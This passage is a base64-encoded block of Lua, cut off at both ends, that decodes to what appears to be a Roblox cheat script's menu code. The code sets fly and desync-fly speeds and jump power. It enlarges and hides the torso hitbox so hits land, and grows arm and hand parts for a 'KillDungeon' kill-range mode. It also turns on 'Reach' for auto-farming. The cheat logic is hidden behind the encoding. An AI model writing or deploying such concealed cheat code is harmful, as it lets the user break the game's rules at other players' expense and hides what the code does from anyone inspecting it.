ciIHRoZW4KICAgICAgICAgICAgICAgIENvbmZpZ1tjb25maWdLZXldID0gSW5wdXQuVGV4dDpnc3ViKCJeJXMqKC4tKSVzKiQiLCAiJTEiKSAtLSBUcmltIHNwYWNlcwogICAgICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJDdXN0b21DdXJzb3JJZCIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhbCA9IENvbmZpZ1tjb25maWdLZXldCiAgICAgICAgICAgICAgICAgICAgaWYgdmFsIH49ICIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9udW1iZXIodmFsKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtb3VzZS5JY29uID0gInJieGFzc2V0aWQ6Ly8iIC4uIHZhbAogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtb3VzZS5JY29uID0gdmFsCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgbW91c2UuSWNvbiA9ICIiCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJBdXRvTG9hZENvbmZpZ05hbWUiIHRoZW4KICAgICAgICAgICAgICAgICAgICBVcGRhdGVMb2FkZXJTZXR0aW5ncygpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgbG9jYWwgbnVtID0gdG9udW1iZXIoSW5wdXQuVGV4dCkKICAgICAgICAgICAgICAgIGlmIG51bSB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gTElNSVRFUyBERSBWSVRFU1NFCiAgICAgICAgICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJGbHlTcGVlZFZhbHVlIiBhbmQgbnVtID4gMzUwIHRoZW4gbnVtID0gMzUwIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiRGVzeW5jRmx5U3BlZWQiIGFuZCBudW0gPiAzNTUgdGhlbiBudW0gPSAzNTUgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnW2NvbmZpZ0tleV0gPSBudW0KICAgICAgICAgICAgICAgICAgICBpZiBjb25maWdLZXkgPT0gIkZPVlZhbHVlIiBhbmQgbnVtID4gMTIwIHRoZW4gbnVtID0gMTIwIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiRk9WVmFsdWUiIGFuZCBudW0gPCAxMCB0aGVuIG51bSA9IDEwIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiSnVtcFBvd2VyVmFsdWUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbiBodW1hbm9pZC5Vc2VKdW1wUG93ZXIgPSB0cnVlIGh1bWFub2lkLkp1bXBQb3dlciA9IG51bSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBJbnB1dC5UZXh0ID0gdG9zdHJpbmcobnVtKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIChjb25maWdLZXkgPT0gIlRvcnNvU2l6ZSIgb3IgY29uZmlnS2V5ID09ICJUb3Jzb1RyYW5zcGFyZW5jeSIpIGFuZCBDb25maWcuSGl0Ym94UHJlc2V0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcyA9IENvbmZpZy5Ub3Jzb1NpemUKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdCA9IENvbmZpZy5Ub3Jzb1RyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdCB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdC5TaXplID0gVmVjdG9yMy5uZXcocywgcywgcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuVHJhbnNwYXJlbmN5ID0gdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdC5DYW5Ub3VjaCA9IHRydWUgLS0gTXVzdCBiZSB0cnVlIGZvciBUUCBIaXQgdG8gd29yayBvbiB0b3VjaAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdC5DYW5RdWVyeSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJCYXNlUGFydCIpIGFuZCAodi5OYW1lID09ICJUb3JzbyIgb3Igdi5OYW1lID09ICJVcHBlclRvcnNvIiBvciB2Lk5hbWUgPT0gIkxvd2VyVG9yc28iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdi5TaXplID0gVmVjdG9yMy5uZXcocywgcywgcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LlRyYW5zcGFyZW5jeSA9IHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LkNhblRvdWNoID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuQ2FuUXVlcnkgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiRHVuZ2VvblJhbmdlIiBhbmQgQ29uZmlnLktpbGxEdW5nZW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcyA9IENvbmZpZy5EdW5nZW9uUmFuZ2UKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3QgdGhlbiByb290LlNpemUgPSBWZWN0b3IzLm5ldyhzLCBzLCBzKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoY2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiQmFzZVBhcnQiKSBhbmQgKHYuTmFtZTpmaW5kKCJBcm0iKSBvciB2Lk5hbWU6ZmluZCgiSGFuZCIpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdi5TaXplID0gVmVjdG9yMy5uZXcocywgcywgcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBJbnB1dC5UZXh0ID0gdG9zdHJpbmcoQ29uZmlnW2NvbmZpZ0tleV0pCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVRvZ2dsZShwYXJlbnQsIHRleHQsIGNvbmZpZ0tleSwgb3JkZXIpCiAgICAgICAgbG9jYWwgRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgIEZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIEZyYW1lLkxheW91dE9yZGVyID0gb3JkZXIKICAgICAgICBGcmFtZS5QYXJlbnQgPSBwYXJlbnQKCiAgICAgICAgbG9jYWwgQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICAgICAgQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgQ29ybmVyLlBhcmVudCA9IEZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCiAgICAgICAgU3Ryb2tlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMzUsIDM1LCA0NSkKICAgICAgICBTdHJva2UuVGhpY2tuZXNzID0gMQogICAgICAgIFN0cm9rZS5QYXJlbnQgPSBGcmFtZQoKICAgICAgICBsb2NhbCBMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICBMYWJlbC5UZXh0ID0gdGV4dAogICAgICAgIExhYmVsLlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAxLCAwKQogICAgICAgIExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1NZWRpdW0KICAgICAgICBMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgIExhYmVsLlRleHRTaXplID0gOQogICAgICAgIExhYmVsLlBhcmVudCA9IEZyYW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgUGFkID0gSW5zdGFuY2UubmV3KCJVSVBhZGRpbmciKQogICAgICAgIFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDEwKQogICAgICAgIFBhZC5QYXJlbnQgPSBMYWJlbAoKICAgICAgICBsb2NhbCBCdXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIEJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAsIDIwLCAwLCAyMCkKICAgICAgICBCdXR0b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTMwLCAwLjUsIC0xMCkKICAgICAgICBCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZ1tjb25maWdLZXldIGFuZCBDdXJyZW50VGhlbWVDb2xvciBvciBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgIEJ1dHRvbi5UZXh0ID0gIiIKICAgICAgICBCdXR0b24uUGFyZW50ID0gRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBCQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICAgICAgQkNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQogICAgICAgIEJDb3JuZXIuUGFyZW50ID0gQnV0dG9uCiAgICAgICAgCiAgICAgICAgLS0gU3RvcmUgYnV0dG9uIGZvciBleHRlcm5hbCB1cGRhdGVzCiAgICAgICAgVG9nZ2xlQnV0dG9uc1tjb25maWdLZXldID0gQnV0dG9uCgogICAgICAgIEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgQ29uZmlnW2NvbmZpZ0tleV0gPSBub3QgQ29uZmlnW2NvbmZpZ0tleV0KICAgICAgICAgICAgQnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWdbY29uZmlnS2V5XSBhbmQgQ3VycmVudFRoZW1lQ29sb3Igb3IgQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiVG9vbENvbG9yQ2hhbmdlciIgYW5kIG5vdCBDb25maWcuVG9vbENvbG9yQ2hhbmdlciB0aGVuCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIHJlc3RvcmVUb29sQ29sb3IoY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJQb3RhdG9HcmFwaGljcyIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaXNMb3cgPSBDb25maWcuUG90YXRvR3JhcGhpY3MKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gRmFzdCBGbGFncyAvIFF1YWxpdHkKICAgICAgICAgICAgICAgIGlmIGlzTG93IHRoZW4KICAgICAgICAgICAgICAgICAgICByZW5kZXJTZXR0aW5ncy5RdWFsaXR5TGV2ZWwgPSBFbnVtLlF1YWxpdHlMZXZlbC5MZXZlbDAxCiAgICAgICAgICAgICAgICAgICAgcmVuZGVyU2V0dGluZ3MuTWVzaFBhcnREZXRhaWxMZXZlbCA9IEVudW0uTWVzaFBhcnREZXRhaWxMZXZlbC5MZXZlbDAxCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgcmVuZGVyU2V0dGluZ3MuUXVhbGl0eUxldmVsID0gRW51bS5RdWFsaXR5TGV2ZWwuQXV0b21hdGljCiAgICAgICAgICAgICAgICAgICAgcmVuZGVyU2V0dGluZ3MuTWVzaFBhcnREZXRhaWxMZXZlbCA9IEVudW0uTWVzaFBhcnREZXRhaWxMZXZlbC5MZXZlbDA0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIExpZ2h0aW5nLkdsb2JhbFNoYWRvd3MgPSBub3QgaXNMb3cKICAgICAgICAgICAgICAgICAgICBMaWdodGluZy5PdXRsaW5lcyA9IG5vdCBpc0xvdwogICAgICAgICAgICAgICAgICAgIFRlcnJhaW4uRGVjb3JhdGlvbiA9IG5vdCBpc0xvdwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHBvdGF0b0RPRi5FbmFibGVkID0gaXNMb3cKICAgICAgICAgICAgICAgICAgICBwb3RhdG9Db2xvci5FbmFibGVkID0gaXNMb3cKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBUZXJyYWluLldhdGVyV2F2ZVNpemUgPSBpc0xvdyBhbmQgMCBvciAwLjE1CiAgICAgICAgICAgICAgICAgICAgVGVycmFpbi5XYXRlcldhdmVTcGVlZCA9IGlzTG93IGFuZCAwIG9yIDEwCiAgICAgICAgICAgICAgICAgICAgVGVycmFpbi5XYXRlclJlZmxlY3RhbmNlID0gaXNMb3cgYW5kIDAgb3IgMQogICAgICAgICAgICAgICAgICAgIFRlcnJhaW4uV2F0ZXJUcmFuc3BhcmVuY3kgPSBpc0xvdyBhbmQgMCBvciAxCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIEl0ZXJhdGUgV29ya3NwYWNlCiAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBmb3IgXywgb2JqIGluIGlwYWlycyh3b3Jrc3BhY2U6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVBvdGF0byhvYmopCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIENvbm5lY3Rpb24KICAgICAgICAgICAgICAgIGlmIGlzTG93IHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBub3QgcG90YXRvQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHBvdGF0b0Nvbm5lY3Rpb24gPSB3b3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ob2JqKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5kZWZlcihmdW5jdGlvbigpIG1ha2VQb3RhdG8ob2JqKSBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBpZiBwb3RhdG9Db25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcG90YXRvQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgcG90YXRvQ29ubmVjdGlvbiA9IG5pbAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgY29uZmlnS2V5ID09ICJIaXRib3hQcmVzZXQiIHRoZW4KICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bSA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIFByb3hpbWl0eVByb21wdFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlByb3hpbWl0eVByb21wdFNlcnZpY2UiKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5IaXRib3hQcmVzZXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAtLSBEaXNhYmxlIFNpdHRpbmcKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtIHRoZW4gaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLS0gRGlzYWJsZSBJbnRlcmFjdGlvbnMgKFByb3hpbWl0eSAmIFRvdWNoKQogICAgICAgICAgICAgICAgICAgICAgICBQcm94aW1pdHlQcm9tcHRTZXJ2aWNlLkVuYWJsZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJCYXNlUGFydCIpIHRoZW4gdi5DYW5Ub3VjaCA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIEJpZyBUb3JzbyBNb2RlIChTa2luIEdsaXRjaCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcyA9IENvbmZpZy5Ub3Jzb1NpemUKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdCA9IENvbmZpZy5Ub3Jzb1RyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuU2l6ZSA9IFZlY3RvcjMubmV3KHMsIHMsIHMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LlRyYW5zcGFyZW5jeSA9IHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LkNhblRvdWNoID0gdHJ1ZSAtLSBFbmFibGUgdG91Y2ggZm9yIFRQIEhpdCBsb2dpYwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdC5DYW5RdWVyeSA9IGZhbHNlIC0tIFByZXZlbnQgbW91c2UgYmxvY2tpbmcKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgYW5kICh2Lk5hbWUgPT0gIlRvcnNvIiBvciB2Lk5hbWUgPT0gIlVwcGVyVG9yc28iIG9yIHYuTmFtZSA9PSAiTG93ZXJUb3JzbyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LlNpemUgPSBWZWN0b3IzLm5ldyhzLCBzLCBzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuVHJhbnNwYXJlbmN5ID0gdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdi5DYW5Ub3VjaCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LkNhblF1ZXJ5ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIFJlc2V0CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGh1bSB0aGVuIGh1bTpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIHRydWUpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBQcm94aW1pdHlQcm9tcHRTZXJ2aWNlLkVuYWJsZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCBkZXNjID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFBsYXllcnM6R2V0SHVtYW5vaWREZXNjcmlwdGlvbkZyb21Vc2VySWQocGxheWVyLlVzZXJJZCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzdWNjZXNzIGFuZCBkZXNjIGFuZCBodW0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQXBwbHlEZXNjcmlwdGlvbkN1c3RvbShodW0sIGRlc2MpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LlNpemUgPSBWZWN0b3IzLm5ldygyLCAyLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LkNhblRvdWNoID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQ2FuUXVlcnkgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFJlc2V0IEFsbCBQYXJ0cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoY2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LkNhblRvdWNoID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LkNhblF1ZXJ5ID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGNvbmZpZ0tleSA9PSAiS2lsbER1bmdlb24iIHRoZW4KICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5LaWxsRHVuZ2VvbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHMgPSBDb25maWcuRHVuZ2VvblJhbmdlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdC5TaXplID0gVmVjdG9yMy5uZXcocywgcywgcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuVHJhbnNwYXJlbmN5ID0gMC41CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoY2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiQmFzZVBhcnQiKSBhbmQgKHYuTmFtZTpmaW5kKCJBcm0iKSBvciB2Lk5hbWU6ZmluZCgiSGFuZCIpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdi5TaXplID0gVmVjdG9yMy5uZXcocywgcywgcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2LlRyYW5zcGFyZW5jeSA9IDAuNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBpZiByb290IHRoZW4K" .. "ICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuU2l6ZSA9IFZlY3RvcjMubmV3KDIsIDIsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb290LlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQ2FuQ29sbGlkZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MsIGRlc2MgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBQbGF5ZXJzOkdldEh1bWFub2lkRGVzY3JpcHRpb25Gcm9tVXNlcklkKHBsYXllci5Vc2VySWQpIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgc3VjY2VzcyBhbmQgZGVzYyBhbmQgaHVtYW5vaWQgdGhlbiBBcHBseURlc2NyaXB0aW9uQ3VzdG9tKGh1bWFub2lkLCBkZXNjKSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBjb25maWdLZXkgPT0gIkZhcm1OZWFyZXN0IiB0aGVuCiAgICAgICAgICAgICAgICBpZiBDb25maWcuRmFybU5lYXJlc3QgdGhlbgogICAgICAgICAgICAgICAgICAgIENvbmZpZy5SZWFjaCA9IHRydWUKICAgICAgICAgICAgICAgICAgICBDb25maWcuUmVhY2hTaXplID0gMTAKICAgICAgICAgICAgICAgICAgICBDb25maWcuUmVhY2hUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siUmVhY2giXSB0aGVuIFRvZ2dsZUJ1dHRvbnNbIlJlYWNoIl0uQmFja2dyb3VuZENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIElucHV0Qm94ZXNbIlJlYWNoU2l6ZSJdIHRoZW4gSW5wdXRCb3hlc1siUmVhY2hTaXplIl0uVGV4dCA9IHRvc3RyaW5nKENvbmZpZy5SZWFjaFNpemUpIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5SZWFjaCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnL